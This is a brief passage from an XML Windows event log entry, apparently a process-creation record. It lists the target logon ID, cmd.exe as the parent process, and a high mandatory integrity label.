      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>
  